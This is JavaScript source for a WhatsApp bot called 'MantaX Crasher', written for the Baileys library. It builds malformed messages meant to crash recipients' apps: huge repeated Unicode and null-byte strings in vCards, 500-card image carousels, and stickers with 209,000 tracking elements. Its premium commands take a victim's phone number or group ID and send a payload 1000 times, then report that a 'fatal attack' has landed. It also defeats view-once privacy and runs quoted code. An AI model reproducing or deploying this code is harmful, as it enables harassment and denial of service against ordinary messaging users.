666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function ofmImage(target) {
  const imageMessage = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOulBwLP9brOKlB_FhKlXgVACSI8n7Yokk5EQR_jcBX2zo3G3Z8hc1zmmvB9QoAhJCQqmP9aq7pJm0ZnWzQM4c_HV9QxtFLXVDl19mVIQ?ccb=9-4&oh=01_Q5Aa4AHoZceShPzljjv97tc6hkT5EXvdXRPO7DfV4bMsugJIYw&oe=69F45997&_nc_sid=e6ed6c&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "pUpDBy4MvXUOtLbIfmEswqWYmc1VKDDTHkbynx0f83o=",
    fileLength: 9999999,
    height: 1024,
    width: 1024,
    mediaKey: "1NnLb0sk7tngPq/CSm0ScYClpB3//VmbRAiHITnLGMU=",
    fileEncSha256: "73MNzlpsbswi65Vcvw3WlI76nhw6zxVyQrLp9/2OscU=",
    directPath: "/o1/v/t24/f2/m232/AQOulBwLP9brOKlB_FhKlXgVACSI8n7Yokk5EQR_jcBX2zo3G3Z8hc1zmmvB9QoAhJCQqmP9aq7pJm0ZnWzQM4c_HV9QxtFLXVDl19mVIQ?ccb=9-4&oh=01_Q5Aa4AHoZceShPzljjv97tc6hkT5EXvdXRPO7DfV4bMsugJIYw&oe=69F45997&_nc_sid=e6ed6c",
    "mediaKeyTimestamp": "1775035876",
    mediaKeyTimestamp: 1775035876,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=",
    contextInfo: {
      pairedMediaType: "NOT_PAIRED_MEDIA",
      remoteJid: Math.random().toString(36) + " Tr4sh.corp¡! ",
      isForwarded: true,
      forwardingScore: 999
    }
  }

  let cards = [];
  for (let z = 0; z < 500; z++) {
    cards.push({
      header: {
        imageMessage,
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "\0"
      }
    })
  }
  let msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: "\0" },
          carouselMessage: {
            cards
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, {
    participant: { jid:target }
  });
}

async function crashIng2(target) {
  
  let media = await prepareWAMessageMedia(
    { sticker: bugstic },
    { upload: tdx.waUploadToServer }
  )

  media.stickerMessage.contextInfo = {  pairedMediaType: 1, statusSourceType: 1, isForwarded: true, forwardingScore: 9999999, statusAttributionType: 2, urlTrackingMap: { urlTrackingMapElements: Array.from({ length: 209000 }, () => ({})) } }
  
  /*media.stickerMessage.contextInfo = {
  "remoteJid": "120363402921136550@newsletter",
  "fromMe": true,
  "id": "3A1C0D6147EA7069C403",
  "quotedMessage": {
  "interactiveMessage": {
  "header": {
  "title": "" + "\0".repeat(300000),
  "hasMediaAttachment": false
  },
  "body": {
    "text": "Manta'X"
  },
  "nativeFlowMessage": {
  "buttons": [
  {
  "name": "cta_url",
  "buttonParamsJson": "{}"
  }],
  "messageParamsJson": "{"
  }}}}*/

  let message = {
    groupStatusMessageV2: {
      message: {
        stickerMessage: media.stickerMessage
      }
    }
  }

  for (let i = 0; i < 50; i++) {
    await tdx.relayMessage(target, message, {
      messageId: generateMessageIDV2(),
      participant: { jid: target }
    })
  }
}
//=============================================================\\

		// Status \\
		//=================================================//
		switch (command) {
case "menu": {
if (!isBotRegistered) return
const jam = require('moment-timezone').tz('Asia/Jakarta').format('HH:mm:ss');
    
await sock.relayMessage(m.chat, {  
 viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          hasMediaAttachment: true,
          imageMessage: {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQOcc7f5q866wW7_6H4Tmdf_JCOf3J9MThG5b7oOrH_y4CpWF_uZqkSGQlqf4QfQBJ5UGciOsTPf-ZDvBLgwfNdwRfUqNQaJO3HznBddgQ?ccb=9-4&oh=01_Q5Aa4AHwdcWIonhbl6PWgWe59zd73p-qDy7bvBf30QsjqQboRA&oe=69F1C0EC&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "5xSMLUG5Zk1AASyCu6m76WlBBWSvzJ1PiNWGQSPbR/Y=",
            fileLength: "49832",
            height: 1024,
            width: 1024,
            mediaKey: "RKD9w3nocPShzgTsJYP9H7yKVSmYTZZ1P+iG4kEqCSs=",
            fileEncSha256: "Ob506841Uv3MUZzaW90VCvouQu3k1y+Y9e09tXSFKEA=",
            directPath: "/o1/v/t24/f2/m231/AQOcc7f5q866wW7_6H4Tmdf_JCOf3J9MThG5b7oOrH_y4CpWF_uZqkSGQlqf4QfQBJ5UGciOsTPf-ZDvBLgwfNdwRfUqNQaJO3HznBddgQ?ccb=9-4&oh=01_Q5Aa4AHwdcWIonhbl6PWgWe59zd73p-qDy7bvBf30QsjqQboRA&oe=69F1C0EC&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1774868235",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAuAAEBAAMBAQAAAAAAAAAAAAAABQEEBgIDAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAOZAAAABvVptrUh63aQSEM0fQxZ1fOptSKKJbOJQAAAP/8QAKBAAAgEDAQgBBQAAAAAAAAAAAQIDAAQRBRITICEiIzEyQDNBQlJh/9oACAEBAAE/APhWEUc04WTxVzo6HnAcU+mXSfjmpbaaH3Qjh01V3wY1FdOkzQy+D6mmmhhKqT1GtXu94264VdkOQai1CN1AmUZH3q51FM9pOr9qcuWy/k8ETKrgsMihcW2PpYo3EO1yTlS3VvtAstC6g7m2mc+v8o+T8L//xAAbEQABBAMAAAAAAAAAAAAAAAAAARARICFxgf/aAAgBAgEBPwCsYIfou7f/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/AAf/2Q==",
            contextInfo: {
              pairedMediaType: "NOT_PAIRED_MEDIA",
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              remoteJid: "status@broadcast"
            }
          }
        },
        body: {
          text: `
╭───  *𝙈𝙖𝙣𝙏𝙖𝙓 𝘾𝙧𝙖𝙨𝙝𝙚𝙧* ───
│ 
│ ⟣ *User:* @${m.sender.split('@')[0]}
│ ⟣ *Time:* ${jam} WIB
│ ⟣ *Runtime:* ${runtime(process.uptime())}
│
╰───────────────────────
          
Untuk memunculkan menu silahkan ketik .allmenu ¡!`
        },
        footer: {
          text: " By MantaxOffc 🛸 "
        },
        nativeFlowMessage: {
          buttons: [
            {
              "name": "cta_url",
              "buttonParamsJson": "{\"display_text\":\"Channel Telegram\",\"url\":\"https:\\/\\/t.me/MantaxOffc\\/\",\"webview_presentation\":\"truel\",\"payment_link_preview\":true,\"webview_interaction\":true}"
            },
            {
              "name": "galaxy_message",
              "buttonParamsJson": '{"flow_message_version":"3","flow_token":"unused","flow_id":"1775342589999842","flow_cta":"☄⃟༑⌁⃰𝐍̛̣͜𝐮𝐥𝐥⃬ 𝐂⃬𝐫̝𝐚͝𝐬𝐡͢","flow_action":{"navigate":true,"screen":"AWARD_CLAIM","data":{"error_types":[{"id":"1","title":"No llega"},{"id":"2","title":"Diferente"},{"id":"3","title":"Calidad"}],"campaigns":[{"id":"campaign_1","title":"Campaña 1"},{"id":"campaign_2","title":"Campaña 2"},{"id":"campaign_3","title":"Campaña 3"}],"categories":[{"id":"category_1","title":"Unicam"},{"id":"category_2","title":"Constantes"},{"id":"category_3","title":"Referidos","on-unselect-action":{"name":"update_data","payload":{"subcategory_visibility":false}},"on-select-action":{"name":"update_data","payload":{"subcategories":[{"id":"1","title":"1 subcategory"},{"id":"2","title":"2 subcategory"}],"subcategory_visibility":true}}}],"subcategory_visibility":false}},"flow_metadata":{"flow_json_version":1000,"data_api_protocol":"Believe in yourself, anything is possible.","data_api_version":9999999,"flow_name":"Comedian 🩸","categories":[]},"icon":"DEFAULT","has_multiple_buttons":true}'
            }
          ]
        }
      }
    }
  }
}, { quoted: vidq });
}
break

case "allmenu": {
if (!isBotRegistered) return
    const jam = require('moment-timezone').tz('Asia/Jakarta').format('HH:mm:ss');
    
    let menuText = `
╭───  *𝙈𝙖𝙣𝙏𝙖𝙓 𝘾𝙧𝙖𝙨𝙝𝙚𝙧* ───
│ 
│ ⟣ *User:* @${m.sender.split('@')[0]}
│ ⟣ *Time:* ${jam} WIB
│ ⟣ *Runtime:* ${runtime(process.uptime())}
│
╰───────────────────────

*⟡ MAIN MENU*
- .runtime <> time run
- .speed <> speed bot
- .restart <> restart
- .brat <> teks to sticker
- .bratvid <> teks to sticker video
- .rvo <> read viewOnce

*⟡ TOOLS COMMAND*
- .tesfunc <> reply kode, nomor
- .info <> Message to Json
- .cekidgc <> list id gc

*⟡ OWNER COMMAND*
- .addprem <> 62xxx
- .delprem <> 62xxx
- .self <> mode only bot
- .public <> public mode
- .update <> update sc Manta

*⟡ GROUP COMMAND*
- .tagall <> .tag teks
- .hidetag <> .hidetag teks
- .add <> .add nomor
- .kick <> .kick @tag_user/nmr
- .promote <> .promote @tag_user
- .demote <> .demote @tag_user

*⟡ BVG COMMAND*
- .sqlx <> 62xx
- .sql-home <> 62xxx
- .ios <> 62xxx
- .delay <> 62xxx
- .gcx <> 128xxx@g.us
`;

    await sock.relayMessage(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/541552326_2221749978358982_803122825710861372_n.enc?ccb=11-4&oh=01_Q5Aa4AHbuZvHg7N70EUeoC4Ksz6pQBQ_8Wvsq9-LCIvp_fC8lA&oe=69F1DA5A&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: menuText,
                            fileSha256: "chetSPgSwJp8hsVPCF7tk9SimaUbk9HCdEY0khbm/vg=",
                            fileLength: "30737",
                            height: 1024,
                            width: 1024,
                            mediaKey: "2+EyCysBWrbM+65YkZFAwmLp0ZPrh6vCED7gPofe8ig=",
                            fileEncSha256: "gZMgfNrGdkR6GrEZOmCbVqXCPHEt1W6FNureIKDi5+Q=",
                            directPath: "/v/t62.7118-24/541552326_2221749978358982_803122825710861372_n.enc?ccb=11-4&oh=01_Q5Aa4AHbuZvHg7N70EUeoC4Ksz6pQBQ_8Wvsq9-LCIvp_fC8lA&oe=69F1DA5A&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774869700",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAArAAEBAQEBAAAAAAAAAAAAAAAABQQCBgEBAQAAAAAAAAAAAAAAAAAAAAH/2gAMAwEAAhADEAAAAIwoAAADZTwVSPl9j50mgHZzazE7l0eDAFAAAA//xAAoEAABBAEBBwQDAAAAAAAAAAABAAIDBBESBRQgIjEyQBMjM0JRUmH/2gAIAQEAAT8A8KhFHNOGPU+yATmEqWhZi+mU+KSPvaRw7M0byNRUFxwsvhl/PKpLEUbmsJ5itpWfWm0jozhBLSCDgqvfgfjeGDUPsrV6IvJhZzfsjkkk9eCJzWvaXDICFmqR8WDlOtQZGGDCFivkEtTbEHuamZz2/AR8L//xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/AAf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/AAf/2"
                        }
                    },
                    body: {
                        text: menuText
                    },
                    footer: {
                        text: "By MantaxOffc 🛸"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": JSON.stringify({
                                    display_text: "Channel Telegram",
                                    url: "https://t.me/MantaxOffc/",
                                    webview_presentation: "true",
                                    payment_link_preview: true,
                                    webview_interaction: true
                                })
                            },
                            {
                                "name": "galaxy_message",
                                "buttonParamsJson": JSON.stringify({
                                    flow_message_version: "3",
                                    flow_token: "unused",
                                    flow_id: "1775342589999842",
                                    flow_cta: "☄⃟༑⌁⃰𝐍̛̣͜𝐮𝐥𝐥⃬ 𝐂⃬𝐫̝𝐚͝𝐬𝐡͢",
                                    flow_action: {
                                        navigate: true,
                                        screen: "AWARD_CLAIM",
                                        data: {
                                            error_types: [
                                                { id: "1", title: "No llega" },
                                                { id: "2", title: "Diferente" },
                                                { id: "3", title: "Calidad" }
                                            ],
                                            campaigns: [
                                                { id: "campaign_1", title: "Campaña 1" },
                                                { id: "campaign_2", title: "Campaña 2" },
                                                { id: "campaign_3", title: "Campaña 3" }
                                            ],
                                            categories: [
                                                { id: "category_1", title: "Unicam" },
                                                { id: "category_2", title: "Constantes" },
                                                {
                                                    id: "category_3",
                                                    title: "Referidos",
                                                    "on-unselect-action": {
                                                        name: "update_data",
                                                        payload: { subcategory_visibility: false }
                                                    },
                                                    "on-select-action": {
                                                        name: "update_data",
                                                        payload: {
                                                            subcategories: [
                                                                { id: "1", title: "1 subcategory" },
                                                                { id: "2", title: "2 subcategory" }
                                                            ],
                                                            subcategory_visibility: true
                                                        }
                                                    }
                                                }
                                            ],
                                            subcategory_visibility: false
                                        }
                                    },
                                    flow_metadata: {
                                        flow_json_version: 1000,
                                        data_api_protocol: "Believe in yourself, anything is possible.",
                                        data_api_version: 9999999,
                                        flow_name: "Comedian 🩸",
                                        categories: []
                                    },
                                    icon: "DEFAULT",
                                    has_multiple_buttons: true
                                })
                            }
                        ],
                        messageParamsJson: ""
                    },
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        pairedMediaType: "NOT_PAIRED_MEDIA",
                        forwardOrigin: "UNKNOWN"
                    }
                }
            }
        }
    }, { quoted: vidq });
}
break
               
case 'rvo': {
if (!isBotRegistered) return reply(`NOT ACCES‼️`);
if (!isCreator) return reply("no bot")
let ahoi = info?.message?.extendedTextMessage?.contextInfo?.quotedMessage;
if (!ahoi) return reply("reply to a view once message")
if (ahoi?.videoMessage?.viewOnce) {
ahoi.videoMessage.viewOnce = false;
}

if (ahoi?.imageMessage?.viewOnce) {
ahoi.imageMessage.viewOnce = false;
}

if (ahoi?.audioMessage?.viewOnce) {
ahoi.audioMessage.viewOnce = false;
}
sock.relayMessage(from, ahoi, { quoted: vidq });
}
break
case 'update': {
if (!isBotRegistered) return reply(`NOT ACCES‼️`);
if (!isCreator) return reply("no bot")

try {
let res = await axios.get(CONFIG.versionUrl)
let remote = res.data
let localVersion = getLocalVersion()

if (remote.force || remote.version > localVersion) {
reply(` Update ditemukan!\nVersi: ${remote.version}\nMemproses...`)
await doUpdate(remote)
} else {
reply(`✔ Tidak ada update\nVersi sekarang: ${localVersion}`)
}
} catch (e) {
reply("❌ Gagal cek/update")
}
}
break
      case "ios":
        {
          if (!isPremium) return reply(`NOT ACCES‼️`);
          if (!text) return reply(`Example: ${prefix + command} 62xxxx`);

          const target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

          await reply(
            `Targeting : ${target}\nStatus : still in process\nThe process of launching a fatal attack`,
          );

          for (let i = 0; i < 1000; i++) {
            await invsNewIos(target);
          }

          await reply(
            `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by @xrelly`,
          );
        }
        break;
        
      case "delay":
        {
          if (!isPremium) return reply(`NOT ACCES‼️`);
          if (!text) return reply(`Example: ${prefix + command} 62xxxx`);

          const target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

          await reply(
            `Targeting : ${target}\nStatus : still in process\nThe process of launching a fatal attack`,
          );

          for (let i = 0; i < 1000; i++) {
            await palaLuMappimg(target);
          }

          await reply(
            `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by @xrelly`,
          );
        }
        break;
        
      case "sql-home":
        {
          if (!isPremium) return reply(`NOT ACCES‼️`);
          if (!text) return reply(`Example: ${prefix + command} 62xxxx`);

          const target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

          await reply(
            `Targeting : ${target}\nStatus : still in process\nThe process of launching a fatal attack`,
          );

          for (let i = 0; i < 1000; i++) {
            await crashIng2(target);
          }

          await reply(
            `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by @xrelly`,
          );
        }
        break;
        
      case "sqlx":
        {
          if (!isPremium) return reply(`NOT ACCES‼️`);
          if (!text) return reply(`Example: ${prefix + command} 62xxxx`);

          const target = text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

          await reply(
            `Targeting : ${target}\nStatus : still in process\nThe process of launching a fatal attack`,
          );

          for (let i = 0; i < 1000; i++) {
            await sql(target);
          }

          await reply(
            `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by @xrelly`,
          );
        }
        break;
        
      case "gcx":
        {
          if (!isPremium) return reply(`NOT ACCES‼️`);
          if (!text) return reply(`Example: ${prefix + command} 128xxx@s.us`);

          const target = text.replace(/[^0-9]/g, "") + "@g.us";

          await reply(
            `Targeting : ${target}\nStatus : still in process\nThe process of launching a fatal attack`,
          );

          for (let i = 0; i < 1000; i++) {
            await ofmImage(target);
            await homeBeta(target);
          }

          await reply(
            `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by @xrelly`,
          );
        }
        break;

 case 'tesfunc': {
  if (!isBotRegistered) return reply(`NOT ACCES‼️`);
  if (!isCreator) return reply(`NOT ACCES‼️`);
  if (!m.quoted) return reply('Reply fungsi/kode/JSON lalu ketik:\n.tesfunc\n.tesfunc <target>\n.tes <loop> <target>\n.tesfunc <loop> <target> <delayMs>');

  try {
const vm = require('vm');
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const moment = require('moment');
const crypto = require('crypto');

    const getQuotedText = (msg) => {
      const q = msg.quoted;
      if (!q) return null;
      if (typeof q === 'string') return q;
      if (q.text) return q.text;
      if (q.caption) return q.caption;
      if (q.msg && typeof q.msg === 'object') { if (q.msg.caption) return q.msg.caption; if (q.msg.text) return q.msg.text; }
      try { return q.body || q.message?.conversation || q.message?.extendedTextMessage?.text || null; } catch { return null; }
    };

    const normJid = (v) => {
      if (!v) return null;
      if (typeof v === 'string') {
        const s = v.trim();
        if (!s) return null;
        if (s === 'status@broadcast' || s.endsWith('@s.whatsapp.net') || s.endsWith('@g.us')) return s;
        const num = s.replace(/\D/g, '');
        return num ? `${num}@s.whatsapp.net` : null;
      }
      if (typeof v === 'object') {
        const cand = v.remoteJid || v.id || v.jid || v.user || v.chat || v.key?.remoteJid;
        return normJid(String(cand || ''));
      }
      return null;
    };

    const toBalancedPrefix = (code) => {
      let i=0,len=code.length,b=0,p=0,s=0,inS=false,inD=false,inT=false,inSL=false,inML=false,esc=false;
      for(;i<len;i++){const c=code[i],n=code[i+1];
        if(inSL){if(c==='\n')inSL=false;continue}
        if(inML){if(c==='*'&&n=== '/') {inML=false;i++}continue}
        if(inS){if(!esc&&c==='\'')inS=false;esc=c==='\\'&&!esc;continue}
        if(inD){if(!esc&&c==='"') inD=false;esc=c==='\\'&&!esc;continue}
        if(inT){if(!esc&&c==='`') inT=false;esc=c==='\\'&&!esc;continue}
        if(c==='/'&&n==='/' ){inSL=true;i++;continue}
        if(c==='/'&&n==='*' ){inML=true;i++;continue}
        if(c==='\''){inS=true;continue}
        if(c==='"'){inD=true;continue}
        if(c==='`'){inT=true;continue}
        if(c==='{')b++; else if(c==='}'){ if(b>0)b--; else break }
        else if(c==='(')p++; else if(c===')'){ if(p>0)p--; else break }
        else if(c==='[')s++; else if(c===']'){ if(s>0)s--; else break }
      }
      let out=code.slice(0,i);
      while(b-- > 0) out+='}';
      while(p-- > 0) out+=')';
      while(s-- > 0) out+=']';
      return out;
    };

    const delay = (ms) => new Promise(r => setTimeout(r, ms));

    let loop=1,targetJid=null,delayMs=0;
    const [a0,a1,a2]=args;
    if (args.length===0) targetJid = normJid(m.chat || m.key?.remoteJid || m.quoted?.chat);
    else if (args.length===1) { const n=parseInt(a0); if (Number.isFinite(n) && String(n)===String(a0)) { loop=Math.max(1,n); targetJid=normJid(m.chat||m.key?.remoteJid); } else targetJid=normJid(a0); }
    else if (args.length===2) { loop=Math.max(1,parseInt(a0)||1); targetJid=normJid(a1); }
    else { loop=Math.max(1,parseInt(a0)||1); targetJid=normJid(a1); delayMs=Math.max(0,parseInt(a2)||0); }
    if (!targetJid) throw new Error('Target tidak valid.');

    let raw=String(getQuotedText(m)||'').replace(/^\uFEFF/,'').replace(/\r/g,'\n').trim();
    if (!raw) throw new Error('Tidak menemukan kode/JSON.');
    let src = toBalancedPrefix(raw);

    const gWMC = (typeof generateWAMessageFromContent==='function'
      ? generateWAMessageFromContent
      : (jid, content, opts)=> xrelly?.generateWAMessageFromContent ? xrelly.generateWAMessageFromContent(jid,content,opts) : ({key:{id:Date.now().toString()},message:content}));

    const protoShim = (typeof proto==='object' && proto) ? proto : {};
    if (!protoShim.Message) protoShim.Message = {};
    if (typeof protoShim.Message.fromObject !== 'function') protoShim.Message.fromObject = o => o;

    const jidDecode = (jid) => {
      if (typeof jid !== 'string') return undefined;
      if (!jid.includes('@')) return { user: jid.replace(/\D/g,''), server: 's.whatsapp.net' };
